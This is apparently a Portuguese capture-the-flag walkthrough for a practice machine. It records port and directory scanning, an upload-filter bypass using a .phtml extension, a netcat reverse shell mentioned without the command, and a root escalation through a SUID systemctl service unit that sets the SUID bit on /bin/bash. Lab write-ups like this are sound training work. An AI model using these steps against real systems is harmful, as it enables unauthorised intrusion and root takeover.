### Definindo o IP da maquina investigada como variavel de sistema
```
export IP=10.10.28.119
```
### nmap 
---
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 15:16 EDT
Nmap scan report for 10.10.51.34 (10.10.51.34)
Host is up (0.22s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
---

### Servidor Web
Apache 2.4.18 rodando na porta 3333/tcp

### Dir Scan goburp
---
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.28.119:3333/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/26 21:29:10 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/internal (Status: 301)
---

### Aplicando o Burp
Usando o burp intruder sniper para testar payloads de extenções de arquivos validas, usando wordlist 
A extenção que passou foi .phtml
---
POST /internal/index.php HTTP/1.1
Host: 10.10.28.119:3333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.28.119:3333/internal/index.php
Content-Type: multipart/form-data; boundary=---------------------------982683350619075981219127305
Content-Length: 5831
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------982683350619075981219127305
Content-Disposition: form-data; name="file"; filename="testel.phtml"
Content-Type: application/x-php
---

### Shell Reverse
Shell reverse feito usando o netcat

### Escalando privilegios
Arquivos com bit suid proucurados
```
find / -perm -4000 2>/dev/null

```
----
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
----
Vunerabilidade encontrada
https://gtfobins.github.io/gtfobins/systemctl/

### Dadndo root para o bash
´´´
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
´´´
